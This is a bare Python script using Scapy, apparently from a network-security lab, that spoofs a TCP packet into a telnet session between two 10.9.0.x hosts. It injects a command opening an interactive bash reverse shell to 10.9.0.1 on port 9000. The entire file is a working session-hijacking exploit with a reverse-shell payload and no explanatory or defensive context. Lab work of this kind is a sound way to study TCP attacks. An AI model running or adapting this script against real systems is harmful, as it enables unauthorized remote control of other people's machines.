#!/usr/bin/env python3
from scapy.all import *

ip  = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=60132, dport=23, flags="A", seq=1695846424, ack=385654532)
data = "\n/bin/bash -i > /dev/tcp/10.9.0.1/9000 0<&1 2>&1\n"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
